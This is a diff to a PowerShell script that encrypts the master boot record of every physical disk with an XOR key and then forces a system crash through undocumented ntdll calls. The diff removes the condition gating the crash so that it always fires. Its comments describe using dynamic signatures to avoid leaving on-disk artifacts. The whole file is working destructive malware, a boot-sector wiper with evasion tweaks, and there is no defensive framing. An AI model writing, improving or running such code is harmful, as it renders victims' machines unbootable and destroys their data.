@@ -10,7 +10,6 @@ $drives = Get-CimInstance -ClassName Win32_DiskDrive
 
 # XOR encryption key
 $key = 0x55
-$mbrOverwritten = $false
 
 foreach ($drive in $drives) {
     $diskPath = "\\.\" + $drive.DeviceID
@@ -34,12 +33,10 @@ foreach ($drive in $drives) {
         $fs.Seek(0, [IO.SeekOrigin]::Begin)
         $fs.Write($mbr, 0, 512)
 
-        # Mark that at least one MBR was successfully overwritten
-        $mbrOverwritten = $true
         Write-Host "Successfully encrypted MBR on $diskPath"
 
     } catch {
-        Write-Host "Failed to process $diskPath - $_"
+        throw "Failed to process $diskPath - $_"
     } finally {
         # Close the file stream
         if ($fs) { $fs.Dispose() }
@@ -47,24 +44,20 @@ foreach ($drive in $drives) {
 }
 
 # Replaced Add-Type with dynamic signatures to eliminate the need for calling CSC and prevent on-disk artifacts
-if ($mbrOverwritten) {
+$asmName = New-Object Reflection.AssemblyName "DInvoke"
+$asm = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+$mod = $asm.DefineDynamicModule("DynamicModule", $false)
+$type = $mod.DefineType("NativeMethods")
 
-    $asmName = New-Object Reflection.AssemblyName "DInvoke"
-    $asm = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-    $mod = $asm.DefineDynamicModule("DynamicModule", $false)
-    $type = $mod.DefineType("NativeMethods")
-
-    function Add-DInvoke {
-        param($DllName, $Name, $ParameterTypes, $ReturnType)
-        $mb = $type.DefinePInvokeMethod($Name, $DllName, 'Public,Static,PinvokeImpl', 'Standard', $ReturnType, $ParameterTypes, 'Winapi', 'Auto')
-        $mb.SetImplementationFlags('PreserveSig')
-    }
-
-    Add-DInvoke -DllName "ntdll" -Name "RtlAdjustPrivilege" -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void])
-    Add-DInvoke -DllName "ntdll" -Name "NtRaiseHardError" -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void])
-
-    $NM = $type.CreateType()
-    $NM::RtlAdjustPrivilege(19, $true, $false, [ref]0)
-    $NM::NtRaiseHardError(3221225506, 0, 0, [IntPtr]::Zero, 6, [ref]0)
-
+function Add-DInvoke {
+    param($DllName, $Name, $ParameterTypes, $ReturnType)
+    $mb = $type.DefinePInvokeMethod($Name, $DllName, 'Public,Static,PinvokeImpl', 'Standard', $ReturnType, $ParameterTypes, 'Winapi', 'Auto')
+    $mb.SetImplementationFlags('PreserveSig')
 }
+
+Add-DInvoke -DllName "ntdll" -Name "RtlAdjustPrivilege" -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void])
+Add-DInvoke -DllName "ntdll" -Name "NtRaiseHardError" -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void])
+
+$NM = $type.CreateType()
+$NM::RtlAdjustPrivilege(19, $true, $false, [ref]0)
+$NM::NtRaiseHardError(3221225506, 0, 0, [IntPtr]::Zero, 6, [ref]0)
